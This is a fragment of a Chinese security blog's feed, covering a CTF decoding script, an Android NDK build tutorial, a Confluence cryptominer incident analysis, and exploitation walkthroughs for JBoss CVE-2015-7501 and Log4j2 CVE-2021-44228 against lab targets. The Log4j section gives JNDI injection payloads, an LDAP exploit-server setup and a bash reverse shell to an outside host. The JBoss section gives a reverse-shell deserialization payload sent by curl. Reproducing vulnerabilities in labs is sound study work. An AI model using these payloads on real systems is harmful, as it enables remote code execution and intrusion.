punctuation">:</span> <span class="token string">'100011'</span><span class="token punctuation">,</span> <span class="token string">'震'</span><span class="token punctuation">:</span> <span class="token string">'100100'</span><span class="token punctuation">,</span> <span class="token string">'噬嗑'</span><span class="token punctuation">:</span> <span class="token string">'100101'</span><span class="token punctuation">,</span> <span class="token string">'随'</span><span class="token punctuation">:</span> <span class="token string">'100110'</span><span class="token punctuation">,</span> <span class="token string">'无妄'</span><span class="token punctuation">:</span> <span class="token string">'100111'</span><span class="token punctuation">,</span> <span class="token string">'明夷'</span><span class="token punctuation">:</span> <span class="token string">'101000'</span><span class="token punctuation">,</span> <span class="token string">'贲'</span><span class="token punctuation">:</span> <span class="token string">'101001'</span><span class="token punctuation">,</span> <span class="token string">'既济'</span><span class="token punctuation">:</span> <span class="token string">'101010'</span><span class="token punctuation">,</span> <span class="token string">'家人'</span><span class="token punctuation">:</span> <span class="token string">'101011'</span><span class="token punctuation">,</span> <span class="token string">'丰'</span><span class="token punctuation">:</span> <span class="token string">'101100'</span><span class="token punctuation">,</span> <span class="token string">'离'</span><span class="token punctuation">:</span> <span class="token string">'101101'</span><span class="token punctuation">,</span> <span class="token string">'革'</span><span class="token punctuation">:</span> <span class="token string">'101110'</span><span class="token punctuation">,</span> <span class="token string">'同人'</span><span class="token punctuation">:</span> <span class="token string">'101111'</span><span class="token punctuation">,</span> <span class="token string">'临'</span><span class="token punctuation">:</span> <span class="token string">'110000'</span><span class="token punctuation">,</span> <span class="token string">'损'</span><span class="token punctuation">:</span> <span class="token string">'110001'</span><span class="token punctuation">,</span> <span class="token string">'节'</span><span class="token punctuation">:</span> <span class="token string">'110010'</span><span class="token punctuation">,</span> <span class="token string">'中孚'</span><span class="token punctuation">:</span> <span class="token string">'110011'</span><span class="token punctuation">,</span> <span class="token string">'归妹'</span><span class="token punctuation">:</span> <span class="token string">'110100'</span><span class="token punctuation">,</span> <span class="token string">'睽'</span><span class="token punctuation">:</span> <span class="token string">'110101'</span><span class="token punctuation">,</span> <span class="token string">'兑'</span><span class="token punctuation">:</span> <span class="token string">'110110'</span><span class="token punctuation">,</span> <span class="token string">'履'</span><span class="token punctuation">:</span> <span class="token string">'110111'</span><span class="token punctuation">,</span> <span class="token string">'泰'</span><span class="token punctuation">:</span> <span class="token string">'111000'</span><span class="token punctuation">,</span> <span class="token string">'大畜'</span><span class="token punctuation">:</span> <span class="token string">'111001'</span><span class="token punctuation">,</span> <span class="token string">'需'</span><span class="token punctuation">:</span> <span class="token string">'111010'</span><span class="token punctuation">,</span> <span class="token string">'小畜'</span><span class="token punctuation">:</span> <span class="token string">'111011'</span><span class="token punctuation">,</span> <span class="token string">'大壮'</span><span class="token punctuation">:</span> <span class="token string">'111100'</span><span class="token punctuation">,</span> <span class="token string">'大有'</span><span class="token punctuation">:</span> <span class="token string">'111101'</span><span class="token punctuation">,</span> <span class="token string">'夬'</span><span class="token punctuation">:</span> <span class="token string">'111110'</span><span class="token punctuation">,</span> <span class="token string">'乾'</span><span class="token punctuation">:</span> <span class="token string">'111111'</span><span class="token punctuation">&#125;</span>li<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span>k<span class="token operator">=</span><span class="token number">0</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> k <span class="token operator">==</span><span class="token number">1</span><span class="token punctuation">:</span>        k<span class="token operator">=</span><span class="token number">0</span>        <span class="token keyword">continue</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        li<span class="token punctuation">.</span>append<span class="token punctuation">(</span>dic<span class="token punctuation">[</span>s<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token keyword">except</span><span class="token punctuation">:</span>        t<span class="token operator">=</span><span class="token string">''</span>        t<span class="token operator">=</span>t<span class="token operator">+</span>s<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">+</span>s<span class="token punctuation">[</span>i<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span>        li<span class="token punctuation">.</span>append<span class="token punctuation">(</span>dic<span class="token punctuation">[</span>t<span class="token punctuation">]</span><span class="token punctuation">)</span>        k<span class="token operator">=</span><span class="token number">1</span>ss<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>li<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>ss<span class="token punctuation">)</span>enc<span class="token operator">=</span><span class="token string">''</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token builtin">len</span><span class="token punctuation">(</span>ss<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    enc<span class="token operator">+=</span><span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token builtin">eval</span><span class="token punctuation">(</span><span class="token string">'0b'</span><span class="token operator">+</span>ss<span class="token punctuation">[</span>i<span class="token punctuation">:</span>i<span class="token operator">+</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>enc<span class="token punctuation">)</span></code></pre><p> 得到flag</p><p>Ch1nA_yyds!</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;&lt;img src=&quot;https://gitee.com/greetdawn/blogImages/raw/master/img/rome1920.jpg&quot;&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="安全竞赛" scheme="http://www.greetdawn.top/categories/%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B/"/>
    
    
    <category term="SCTF2021" scheme="http://www.greetdawn.top/tags/SCTF2021/"/>
    
  </entry>
  
  <entry>
    <title>Android Studio手动使用makefile编译</title>
    <link href="http://www.greetdawn.top/2021/12/25/wechat/Android%20Studio%E6%89%8B%E5%8A%A8%E4%BD%BF%E7%94%A8makefile%E7%BC%96%E8%AF%91/"/>
    <id>http://www.greetdawn.top/2021/12/25/wechat/Android%20Studio%E6%89%8B%E5%8A%A8%E4%BD%BF%E7%94%A8makefile%E7%BC%96%E8%AF%91/</id>
    <published>2021-12-25T02:19:26.000Z</published>
    <updated>2021-12-25T07:58:56.162Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Android-Studio手动使用makefile编译"><a href="#Android-Studio手动使用makefile编译" class="headerlink" title="Android Studio手动使用makefile编译"></a>Android Studio手动使用makefile编译</h1><p>用makefile文件编译能够选择编译的目标是共享库或者可执行文件。</p><h2 id="新建Java工程"><a href="#新建Java工程" class="headerlink" title="新建Java工程"></a>新建Java工程</h2><p>用Android Studio新建一个普通<code>Empty Activity</code>项目。</p><h2 id="新建-jni-cpp-目录"><a href="#新建-jni-cpp-目录" class="headerlink" title="新建 jni/cpp 目录"></a>新建 jni/cpp 目录</h2><p>在刚刚创建好的项目中，在<code>src &gt; main</code>目录下新建<code>jni</code>或者<code>cpp</code>目录。新建文件<code>Android.mk</code>、<code>Application.mk</code>以及源码文件。</p><p><img src="https://gitee.com/koifishly/pb/raw/master/2021/12/24/23-02-634.png" alt="image-20211224230250586"></p><p><img src="https://gitee.com/koifishly/pb/raw/master/2021/12/24/23-06-657.png" alt="image-20211224230659627"></p><h2 id="Android-mk"><a href="#Android-mk" class="headerlink" title="Android.mk"></a>Android.mk</h2><pre class="language-makefile" data-language="makefile"><code class="language-makefile"><span class="token comment"># Android.mk必须以LOCAL_PATH开头，注释#除外</span><span class="token comment"># 设置工做目录，而my-dir则会返回Android.mk文件所在的目录</span>LOCAL_PATH <span class="token operator">:=</span> <span class="token variable">$</span><span class="token punctuation">(</span><span class="token keyword">call</span> my-dir<span class="token punctuation">)</span><span class="token comment"># 借助CLEAR_VARS变量清除除LOCAL_PATH外的全部LOCAL_&lt;name>变量</span><span class="token keyword">include</span> <span class="token variable">$</span><span class="token punctuation">(</span>CLEAR_VARS<span class="token punctuation">)</span><span class="token comment"># 设置模块的名称，即编译出来so或者可执行文件文件名</span><span class="token comment"># 注，如果用Android Studio自带原生项目就要要和build.gradle中NDK节点设置的名字相同</span>LOCAL_MODULE <span class="token operator">:=</span> helloworld<span class="token comment"># 指定参与模块编译的C/C++源文件列表，多文件用"\"隔开</span>LOCAL_SRC_FILES <span class="token operator">:=</span> helloworld.cpp<span class="token comment">#### 可选选项</span>LOCAL_CFLAGS <span class="token operator">+=</span> -fPICLOCAL_LDFLAGS <span class="token operator">+=</span> -pie<span class="token comment"># 必须在文件结尾定义编译类型，指定生成的静态库或者共享库在运行时依赖的共享库模块列表。</span><span class="token comment"># BUILD_SHARED_LIBRARY 共享库，供java或者其余共享库调用</span><span class="token comment"># BUILD_STATIC_LIBRARY 静态库，供共享库调用，不能直接被java调用</span><span class="token keyword">include</span> <span class="token variable">$</span><span class="token punctuation">(</span>BUILD_SHARED_LIBRARY<span class="token punctuation">)</span></code></pre><blockquote><p>fPIC和fPIE</p><p>-fPIC与-fpic都是在编译时加入的选项，用于生成位置无关的代码(Position-Independent-Code)。这两个选项都是可以使代码在加载到内存时使用相对地址，所有对固定地址的访问都通过全局偏移表(GOT)来实现。-fPIC和-fpic最大的区别在于是否对GOT的大小有限制。-fPIC对GOT表大小无限制，所以如果在不确定的情况下，使用-fPIC是更好的选择。<br>-fPIE与-fpie是等价的。这个选项与-fPIC/-fpic大致相同，不同点在于：-fPIC用于生成动态库，-fPIE用与生成可执行文件。再说得直白一点：-fPIE用来生成位置无关的可执行代码。</p></blockquote><blockquote><p>pie：随机地址。</p></blockquote><h2 id="Application-mk"><a href="#Application-mk" class="headerlink" title="Application.mk"></a>Application.mk</h2><pre class="language-makefile" data-language="makefile"><code class="language-makefile"><span class="token comment"># 最经常使用的APP_ABI字段：指定须要基于哪些CPU平台的.so文件</span><span class="token comment"># 常见的平台有armeabi x86 mips，其中移动设备主要是armeabi平台</span><span class="token comment"># 默认状况下，Android平台会生成全部平台的.so文件，即同APP_ABI := armeabi x86 mips</span><span class="token comment"># 指定CPU平台类型后，就只会生成该平台的.so文件，即上述语句只会生成armeabi平台的.so文件</span><span class="token comment"># APP_ABI := all armeabi armeabi-v7a mips x86</span>APP_ABI <span class="token operator">:=</span> armeabi-v7aAPP_PLATFORM <span class="token operator">:=</span> android-23<span class="token comment"># Android.mk设置可能不起效果，放在这里设置</span>APP_PIE <span class="token operator">:=</span> true<span class="token comment"># 其他可选</span><span class="token comment">#APP_STL := c++_static</span><span class="token comment">#APP_CPPFLAGS := -fexceptions -frtti</span></code></pre><blockquote><p><code>Application.mk</code>中部分设置已经无效了，需要在<code>build.gradle(Module: app)</code>中的<code>android &gt; defaultConfig</code>声明这些参数的值。</p></blockquote><h2 id="CPP文件"><a href="#CPP文件" class="headerlink" title="CPP文件"></a>CPP文件</h2><p>这里主要是源码的编写。</p><pre class="language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> <span class="token function">helloWorld</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> <span class="token number">999</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><h2 id="项目设置"><a href="#项目设置" class="headerlink" title="项目设置"></a>项目设置</h2><ul><li><p>添加编译cpp工程的NDK目录</p><p><img src="https://gitee.com/koifishly/pb/raw/master/2021/12/24/23-34-130.png" alt="image-20211224233448071"></p></li><li><p>指明<code>Android.mk</code>的路径。</p><p>在<code>build.gradle(Module: app)</code>中指明<code>Android.mk</code>的路径。</p><pre class="language-none"><code class="language-none">android &#123;    compileSdk 22    defaultConfig &#123;        applicationId &quot;com.example.cmake&quot;        minSdk 21        targetSdk 22        versionCode 1        versionName &quot;1.0&quot;        testInstrumentationRunner &quot;androidx.test.runner.AndroidJUnitRunner&quot;    &#125;    buildTypes &#123;        release &#123;            minifyEnabled false            proguardFiles getDefaultProguardFile(&#39;proguard-android-optimize.txt&#39;), &#39;proguard-rules.pro&#39;        &#125;    &#125;    externalNativeBuild &#123;        ndkBuild &#123;            path file(&#39;src&#x2F;main&#x2F;jni&#x2F;Android.mk&#39;)        &#125;    &#125;    compileOptions &#123;        sourceCompatibility JavaVersion.VERSION_1_8        targetCompatibility JavaVersion.VERSION_1_8    &#125;&#125;</code></pre></li></ul><h2 id="编译"><a href="#编译" class="headerlink" title="编译"></a>编译</h2><p>在要使用的NDK版本中找到<code>ndk-build</code>，将前面添加入环境变量。</p><p><img src="https://gitee.com/koifishly/pb/raw/master/2021/12/24/23-26-564.png" alt="image-20211224232639494"></p><p>在makefile目录下输入命令<code>ndk-build</code>。</p><p><img src="https://gitee.com/koifishly/pb/raw/master/2021/12/24/23-44-476.png" alt="image-20211224234440421"></p><p>编译生成lib以及中间文件在上级目录。</p><p><img src="https://gitee.com/koifishly/pb/raw/master/2021/12/24/23-46-315.png" alt="image-20211224234633262"></p><h2 id="IDA查看"><a href="#IDA查看" class="headerlink" title="IDA查看"></a>IDA查看</h2><p>用IDA查看编译出来的库，只有一个我们编写的函数，直接F5查看源码。</p><p><img src="https://gitee.com/koifishly/pb/raw/master/2021/12/24/23-49-433.png" alt="image-20211224234925397"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Android-Studio手动使用makefile编译&quot;&gt;&lt;a href=&quot;#Android-Studio手动使用makefile编译&quot; class=&quot;headerlink&quot; title=&quot;Android Studio手动使用makefile编译&quot;&gt;&lt;/a&gt;An</summary>
      
    
    
    
    <category term="android" scheme="http://www.greetdawn.top/categories/android/"/>
    
    <category term="jni" scheme="http://www.greetdawn.top/categories/android/jni/"/>
    
    
    <category term="cmake" scheme="http://www.greetdawn.top/tags/cmake/"/>
    
  </entry>
  
  <entry>
    <title>jboss反序列化(CVE-2015-7501)</title>
    <link href="http://www.greetdawn.top/2021/12/24/vulfocus/jboss%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-CVE-2015-7501/"/>
    <id>http://www.greetdawn.top/2021/12/24/vulfocus/jboss%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-CVE-2015-7501/</id>
    <published>2021-12-24T09:49:20.000Z</published>
    <updated>2021-12-24T09:55:26.951Z</updated>
    
    <content type="html"><![CDATA[<h2 id="漏洞概述"><a href="#漏洞概述" class="headerlink" title="漏洞概述"></a>漏洞概述</h2><p>Red Hat JBoss Application Server（AS，也称WildFly）是美国红帽（Red Hat）公司的一款基于JavaEE的开源的应用服务器，它具有启动超快、轻量、模块化设计、热部署和并行部署、简洁管理、域管理及第一类元件等特性。 红帽 JBoss A-MQ 6.x；BPM 套件 (BPMS) 6.x；BRMS 6.x 和 5.x；数据网格（JDG）6.x；数据虚拟化 (JDV) 6.x 和 5.x；企业应用平台 6.x、5.x 和 4.3.x；保险丝 6.x; 保险丝维修工程 (FSW) 6.x；运营网络（JBoss ON）3.x；传送门 6.x；SOA 平台 (SOA-P) 5.x；网络服务器（JWS）3.x；红帽 OpenShift/xPAAS 3.x；和 Red Hat Subscription Asset Manager 1.3 允许远程攻击者通过与 Apache Commons Collections (ACC) 库相关的精心设计的序列化 Java 对象执行任意命令。</p><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>使用 JavaDeserH2HC工具生成序列化数据</p><pre class="language-bash" data-language="bash"><code class="language-bash">javac -cp .:commons-collections-3.2.1.jar ReverseShellCommonsCollectionsHashMap.javajava -cp .:commons-collections-3.2.1.jar  ReverseShellCommonsCollectionsHashMap ip:port <span class="token function">curl</span> http://vulfocus.fofa.so:38046/invoker/JMXInvokerServlet --data-binary @ReverseShellCommonsCollectionsHashMap.ser</code></pre><p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20211224175451260.png" alt="image-20211224175451260"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;漏洞概述&quot;&gt;&lt;a href=&quot;#漏洞概述&quot; class=&quot;headerlink&quot; title=&quot;漏洞概述&quot;&gt;&lt;/a&gt;漏洞概述&lt;/h2&gt;&lt;p&gt;Red Hat JBoss Application Server（AS，也称WildFly）是美国红帽（Red Hat）公司</summary>
      
    
    
    
    <category term="vulfocus" scheme="http://www.greetdawn.top/categories/vulfocus/"/>
    
    
    <category term="jboss" scheme="http://www.greetdawn.top/tags/jboss/"/>
    
  </entry>
  
  <entry>
    <title>记confluence的一次溯源</title>
    <link href="http://www.greetdawn.top/2021/12/17/web-security/%E8%AE%B0confluence%E7%9A%84%E4%B8%80%E6%AC%A1%E6%BA%AF%E6%BA%90/"/>
    <id>http://www.greetdawn.top/2021/12/17/web-security/%E8%AE%B0confluence%E7%9A%84%E4%B8%80%E6%AC%A1%E6%BA%AF%E6%BA%90/</id>
    <published>2021-12-17T03:33:39.000Z</published>
    <updated>2021-12-23T07:38:01.911Z</updated>
    
    <content type="html"><![CDATA[<h1 id="记一次confluence挖矿溯源"><a href="#记一次confluence挖矿溯源" class="headerlink" title="记一次confluence挖矿溯源"></a>记一次confluence挖矿溯源</h1><h1 id="1、背景概述"><a href="#1、背景概述" class="headerlink" title="1、背景概述"></a>1、背景概述</h1><p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/Untitled.png" alt="Untitled"></p><h1 id="2、事件分析"><a href="#2、事件分析" class="headerlink" title="2、事件分析"></a>2、事件分析</h1><p>该阿里云的系统客户部署一套了线上的confluence系统，且该系统是部署于我司的虎盾零信任安全访问系统内的，对其公网应用接口的暴露面进行了严格收敛。据得知客户在前天刚好将该收敛系统短暂暴露在公网中，增加其被攻击的可能性，导致最后被注入挖矿病毒。</p><p>前期获取客户某员工用户登录账户，获取当前使用的版本为<strong>Confluence 7.9.3</strong></p><p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/Untitled%201.png" alt="Untitled"></p><p>根据该系统版本，在互联网中发现该系统存在远程代码执行漏洞（CVE-2021-26084），且该系统漏洞在八月底被黑产大规模利用执行挖矿程序。</p><p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/Untitled%202.png" alt="Untitled"></p><p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/Untitled%203.png" alt="Untitled"></p><h1 id="3、攻击分析"><a href="#3、攻击分析" class="headerlink" title="3、攻击分析"></a>3、攻击分析</h1><p>查看系统进程，发现恶意运行进程 ps -ef</p><p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/Untitled%204.png" alt="Untitled"></p><p>根据阿里云告警提示的路径该文件创建的时间为 Dec 13 12:42</p><p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/Untitled%205.png" alt="Untitled"></p><p>下载该路径文件获取矿池地址<a href="http://j0llychic.com:9999/">j0llychic.com:9999</a></p><p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/Untitled%206.png" alt="Untitled"></p><p>获取该矿池的IP地址165.232.129.60定位为美国的一个矿池地址</p><p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/Untitled%207.png" alt="Untitled"></p><p>用户名和密码：</p><p>“user”: “47W42XBUVVm3Nwc1h6dqN9YJm8XiCR5yzBpeiWjpUdAdJdpxT4bHVnoczTDvdG1xtsF3YSD1hJviq5bLFNTPVMcj7sNKvs4”,<br>“pass”: “82b1ee75afa6”,</p><p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/Untitled%208.png" alt="Untitled"></p><p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/Untitled%209.png" alt="Untitled"></p><p>查看了一下目前恶意进程trace运行情况，该进程cpu占用率为15%，并未太高</p><p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/Untitled%2010.png" alt="Untitled"></p><p>系统日志中目前并未发现其他的可疑连接及运行进程</p><p>且confluence日志中也并未发现可疑的请求日志记录</p><p>目前大概率怀疑黑产是通过CVE-2021-26084漏洞部署的远程挖矿程序，且清空了相应的请求记录</p><h1 id="4、病毒清理"><a href="#4、病毒清理" class="headerlink" title="4、病毒清理"></a>4、病毒清理</h1><h2 id="杀死进程"><a href="#杀死进程" class="headerlink" title="杀死进程"></a>杀死进程</h2><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">ps</span> -ef <span class="token operator">|</span> <span class="token function">grep</span> trace<span class="token function">kill</span> -9 <span class="token number">14387</span></code></pre><p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/Untitled%2011.png" alt="Untitled"></p><h2 id="文件清理"><a href="#文件清理" class="headerlink" title="文件清理"></a>文件清理</h2><p>rm -rf /root/c3pool/</p><p>恶意进程不存在</p><p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/Untitled%2012.png" alt="Untitled"></p><p>矿池连接已不存在</p><p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/Untitled%2013.png" alt="Untitled"></p><h1 id="5、漏洞复现"><a href="#5、漏洞复现" class="headerlink" title="5、漏洞复现"></a>5、漏洞复现</h1><p>漏洞验证，该系统存在<code>CVE-2021-26084</code></p><p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20211217113141317.png" alt="image-20211217113141317"></p><p>无虎盾收敛，应用面暴露，直接利用</p><p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20211217112917496.png" alt="image-20211217112917496"></p><p>虎盾收敛应用暴露面，已知应用和版本漏洞的情况下，未达成利用</p><p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20211217112939883.png" alt="image-20211217112939883"></p><p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20211217112948533.png" alt="image-20211217112948533"></p><h1 id="6、总结分析"><a href="#6、总结分析" class="headerlink" title="6、总结分析"></a>6、总结分析</h1><p>该客户系统部署于虎盾零信任安全产品体系下，并未遭受任何攻击，很好的对应用在公网的访问权限进行了严格限制和收敛。由于系统的短暂公网暴露，且该系统存在较新的版本漏洞，而遭受了此次严重的攻击，被黑客部署了挖矿病毒。</p><h1 id="7、防范措施"><a href="#7、防范措施" class="headerlink" title="7、防范措施"></a>7、防范措施</h1><h2 id="升级系统版本"><a href="#升级系统版本" class="headerlink" title="升级系统版本"></a>升级系统版本</h2><p>目前官方已在高版本中修复了该漏洞，请受影响的用户升级至安全版本。</p><p><a href="https://www.atlassian.com/software/confluence/download-archives">https://www.atlassian.com/software/confluence/download-archives</a></p><p>安全版本列表</p><ul><li>Atlassian Confluence Server/Data Center 6.13.23</li><li>Atlassian Confluence Server/Data Center 7.4.11</li><li>Atlassian Confluence Server/Data Center 7.11.6</li><li>Atlassian Confluence Server/Data Center 7.12.5</li><li>Atlassian Confluence Server/Data Center 7.13.0</li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;记一次confluence挖矿溯源&quot;&gt;&lt;a href=&quot;#记一次confluence挖矿溯源&quot; class=&quot;headerlink&quot; title=&quot;记一次confluence挖矿溯源&quot;&gt;&lt;/a&gt;记一次confluence挖矿溯源&lt;/h1&gt;&lt;h1 id=&quot;1、背景概</summary>
      
    
    
    
    <category term="Security" scheme="http://www.greetdawn.top/categories/Security/"/>
    
    
    <category term="溯源分析" scheme="http://www.greetdawn.top/tags/%E6%BA%AF%E6%BA%90%E5%88%86%E6%9E%90/"/>
    
  </entry>
  
  <entry>
    <title>log4j2RCE(CVE-2021-44228)漏洞利用与分析</title>
    <link href="http://www.greetdawn.top/2021/12/11/%E6%BC%8F%E6%B4%9E%E7%A0%94%E7%A9%B6/log4j2RCE-CVE-2021-44228/"/>
    <id>http://www.greetdawn.top/2021/12/11/%E6%BC%8F%E6%B4%9E%E7%A0%94%E7%A9%B6/log4j2RCE-CVE-2021-44228/</id>
    <published>2021-12-11T07:39:48.000Z</published>
    <updated>2021-12-28T05:24:27.994Z</updated>
    
    <content type="html"><![CDATA[<h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述:"></a>漏洞描述:</h2><p>Apache Log4j2 是一款开源的 Java 日志记录工具，大量的业务框架都使用了该组件。如：Apache Struts2、Apache Solr、Apache Druid、Apache Flink等。此次漏洞是用于 Log4j2 提供的 lookup 功能造成的，该功能允许开发者通过一些协议去读取相应环境中的配置。但在实现的过程中，并未对输入进行严格的判断，从而造成漏洞的发生。</p><h2 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围:"></a>影响范围:</h2><p>Apache Log4j 2.x &lt; 2.15.0-rc2</p><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><h3 id="本地复现"><a href="#本地复现" class="headerlink" title="本地复现"></a>本地复现</h3><p>编写本地<code>exp</code>类</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">import</span> <span class="token namespace">com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>xpath<span class="token punctuation">.</span>internal<span class="token punctuation">.</span>objects<span class="token punctuation">.</span></span><span class="token class-name">XString</span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> exp <span class="token punctuation">&#123;</span>    <span class="token keyword">static</span> <span class="token punctuation">&#123;</span>        <span class="token comment">// System.out.print("正在执行命令");</span>        <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>            <span class="token class-name">Runtime</span> rt <span class="token operator">=</span> <span class="token class-name">Runtime</span><span class="token punctuation">.</span><span class="token function">getRuntime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment">// String[] commands = &#123;"bash", "-i", ">&amp;", "/dev/tcp/139.196.234.164/5555 0>&amp;1"&#125;;</span>            <span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> commands <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">"Calc"</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>            <span class="token class-name">Process</span> pc <span class="token operator">=</span> rt<span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span>commands<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"正在执行命令"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            pc<span class="token punctuation">.</span><span class="token function">waitFor</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> e<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre><p>本地编译为<code>class</code>文件</p><pre class="language-none"><code class="language-none">javac exp.java</code></pre><p>使用<code>marshalsec</code>本地启用恶意监听服务</p><pre class="language-bash" data-language="bash"><code class="language-bash">java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer <span class="token string">"http://192.168.1.81:8000/#exp"</span> <span class="token number">7788</span></code></pre><p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20211223155305869.png" alt="image-20211223155305869"></p><p>使用<code>Python3</code>在恶意类文件路径下启动一个简易<code>http</code>服务</p><pre class="language-bash" data-language="bash"><code class="language-bash">python3 -m http.server</code></pre><p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20211223155241001.png" alt="image-20211223155241001"></p><p>插入恶意<code>payload</code>执行，触发命令执行</p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token variable">$&#123;jndi<span class="token operator">:</span>ldap<span class="token operator">:</span><span class="token operator">/</span><span class="token operator">/</span>192.168.1.81<span class="token operator">:</span>7788<span class="token operator">/</span>exp&#125;</span></code></pre><p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20211223155523118.png" alt="image-20211223155523118"></p><h3 id="线上靶机复现-shell反弹"><a href="#线上靶机复现-shell反弹" class="headerlink" title="线上靶机复现-shell反弹"></a>线上靶机复现-shell反弹</h3><p>使用<code>JNDI</code>启动恶意服务</p><pre class="language-bash" data-language="bash"><code class="language-bash">java -jar JNDIExploit-1.2-SNAPSHOT.jar -i <span class="token string">"x.x.x.x"</span> -p <span class="token number">6666</span></code></pre><p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20211223155823005.png" alt="image-20211223155823005"></p><p>构造攻击payload:</p><pre class="language-none"><code class="language-none">payload&#x3D;$&#123;jndi:ldap:&#x2F;&#x2F;x.x.x.x:1389&#x2F;TomcatBypass&#x2F;Command&#x2F;Base64&#x2F;YmFzaCAtaSA%252BJiAvZGV2L3RjcC8xMzkuMTk2LjIzNC4xNjQvNTU1NSAwPiYx&#125;</code></pre><p>注：后面command需要经过一次base64编码，两次URL编码处理</p><pre class="language-none"><code class="language-none">command: bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;x.x.x.x&#x2F;5555 0&gt;&amp;1</code></pre><p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20211223160404738.png" alt="image-20211223160404738"></p><p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20211223160320680.png" alt="image-20211223160320680"></p><h3 id="线上靶机复现-回显输出"><a href="#线上靶机复现-回显输出" class="headerlink" title="线上靶机复现-回显输出"></a>线上靶机复现-回显输出</h3><p>使用<code>vulfocus</code>上的靶机测试</p><p>用<code>Log4j2 jndi injection fuzz tool</code>对主机进行模糊测试，找到传参点在<code>header</code>头</p><p><img 